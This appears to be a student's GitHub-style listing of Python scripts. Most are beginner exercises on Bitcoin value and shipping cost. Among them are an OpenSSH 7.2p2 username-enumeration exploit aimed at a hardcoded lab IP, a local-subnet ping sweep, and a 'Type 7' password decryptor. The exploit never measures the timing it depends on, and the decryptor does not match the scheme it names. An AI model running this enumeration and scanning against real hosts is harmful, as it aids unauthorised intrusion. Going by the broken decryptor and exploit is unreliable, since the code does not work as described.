# Python

Welcome to the Python section. Here are the available scripts:


## bitcoinv2.py

```python
"""
    In this project, you'll create a program that that tells
    you when the value of your Bitcoin falls below $30,000.

    You will need to:
    - Create a function to convert Bitcoin to USD
    - If your Bitcoin falls below $30,000, print a message.

    You can assume that 1 Bitcoin is worth $40,000

"""

investment_in_bitcoin = 1.2
bitcoin_to_usd = 40000
bitcoin_amount = 1
bitcoin_value_usd = 40000
# 1) write a function to calculate bitcoin to usd
def bitcoinToUSD(bitcoin_amount, bitcoin_value_usd):
    dollars = bitcoin_amount * bitcoin_value_usd
    return dollars
bitvalue = bitcoinToUSD(bitcoin_amount, bitcoin_value_usd)
if bitvalue <= 30000:
    print("Bitcoin value in buy range:", bitvalue)
if bitvalue >= 30000:
    print("Bitcoin value in hold range:", bitvalue)


# 2) use function to calculate if the investment is below $30,000


# 2) use function to calculate if its below $30,000 
```

## BitcoinValueTracker.py

```python
"""
    In this project, you'll create a program that that tells
    you when the value of your Bitcoin falls below $30,000.

    You will need to:
    - Create a function to convert Bitcoin to USD
    - If your Bitcoin falls below $30,000, print a message.

    You can assume that 1 Bitcoin is worth $40,000

"""

investment_in_bitcoin = 1.2
bitcoin_to_usd = 40000
bitcoin_amount=1
# 1) write a function to calculate bitcoin to usd
def bitcoinToUSD(bitcoin_amount, bitcoin_to_usd):
  return bitcoin_amount * bitcoin_to_usd

print(bitcoinToUSD(bitcoin_amount, bitcoin_to_usd))
# 2) use function to calculate if the investment is below $30,000
currentbitval=bitcoinToUSD(bitcoin_amount, bitcoin_to_usd)

print("Current Bitcoin dollar value:", currentbitval)

if currentbitval<30000:
    print("Buy Now!")

# 2) use function to calculate if its below $30,000 
```

## decrypt_type7.py

```python
import sys
import base64

def decrypt_type7(encrypted_password):
    try:
        # Extract the encrypted part from the Type 7 password (after the third '$')
        encrypted_part = encrypted_password.split('$')[-1]

        # Add necessary padding to make the base64 string length a multiple of 4
        padding_needed = len(encrypted_part) % 4
        if padding_needed != 0:
            encrypted_part += '=' * (4 - padding_needed)

        # Decode the base64-encoded encrypted part
        decoded_encrypted = base64.b64decode(encrypted_part)

        # Get the key used for encryption (first byte of decoded data)
        key = decoded_encrypted[0]

        # Decrypt the password bytes using the key
        decrypted_bytes = [char ^ key for char in decoded_encrypted[1:]]

        # Convert the decrypted bytes back to a string
        decrypted_password = ''.join(chr(byte) for byte in decrypted_bytes)

        return decrypted_password

    except Exception as e:
        print(f"Error: {e}")
        return None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python decrypt_type7.py <type7_password>")
        sys.exit(1)

    encrypted_password = sys.argv[1]
    decrypted_password = decrypt_type7(encrypted_password)

    if decrypted_password:
        print(f"Decrypted password: {decrypted_password}")
    else:
        print("Failed to decrypt the password.")

```

## exploit_OpenSSHd_7.2p2_username_enumeration.py

```python
import paramiko
import time

# Prompt user for SSH username
user = input("Enter SSH username: ")

# Set a long password for testing (25000 'A' characters)
p = 'A' * 25000

# Initialize SSH client
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    # Connect to SSH server (replace IP address and port)
    ssh.connect('10.10.190.142', port=2222, username=user, password=p)
    print("SSH connection successful!")
except Exception as e:
    print("SSH connection failed:", str(e))
finally:
    # Close SSH connection
    ssh.close()

```

## MISC CODE FILE.py

```python
import matplotlib.pyplot as plt

# Define the disciplines and their contributions
disciplines = ['Cybersecurity', 'Law', 'Ethics']
contributions = [30, 35, 25]  # Example percentages for contribution to the integrated perspective

# Create a pie chart to represent the integration of disciplines
plt.figure(figsize=(7,7))
plt.pie(contributions, labels=disciplines, autopct='%1.1f%%', startangle=140, colors=['#ff9999','#66b3ff','#99ff99'])
plt.title('Integration of Disciplines in Privacy Research (Cybersecurity, Law, Ethics)')
plt.axis('equal')  # Equal aspect ratio ensures the pie chart is circular.
plt.show()

```

## pingsweep.py

```python
#!/usr/bin/env python3
import subprocess
import ipaddress
import netifaces
import sys
from multiprocessing import Pool

# Function to extract network prefix from IP address
def get_network_prefix(ip):
    ip = ipaddress.ip_interface(ip)
    return ip.network.network_address

# Function to perform ping sweep for a given IP address
def ping_sweep(ip):
    result = subprocess.run(['ping', '-c', '1', '-W', '1', str(ip)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if result.returncode == 0:
        print(ip)

# Get the IP address of the host
ip_address = None
for interface in netifaces.interfaces():
    addresses = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
    if addresses is not None:
        for address in addresses:
            if 'addr' in address and not ipaddress.ip_address(address['addr']).is_loopback:
                ip_address = address['addr']
                break
    if ip_address:
        break

if not ip_address:
    print("Failed to retrieve IP address. Please check your network connection.")
    sys.exit(1)

# Extract the network prefix
network_prefix = get_network_prefix(ip_address)

# Print the network prefix
print("Network prefix:", network_prefix)

# Create a pool of worker processes
pool = Pool()

# Loop over the IP addresses in the range 1 to 254 within the same network prefix
ip_addresses = [str(network_prefix) + "." + str(ip_suffix) for ip_suffix in range(1, 255)]

# Perform ping sweep asynchronously
for ip in ip_addresses:
    pool.apply_async(ping_sweep, (ip,))

# Close the pool to prevent further tasks from being submitted
pool.close()

# Wait for the worker processes to complete
pool.join()

```

## PythonPractice.py

```python
print ("helloworld")


```

## ShippingCost.py

```python
customer_basket_cost = 101
customer_basket_weight = 44
shipping=0 + customer_basket_cost
weight_cost=1.20
shippingunder100= weight_cost*customer_basket_weight+customer_basket_cost

# Write if statement here to calculate the total cost

if customer_basket_cost>=100:
  print(shipping)

  
else:
    customer_basket_weight<100

    print(shippingunder100)
```
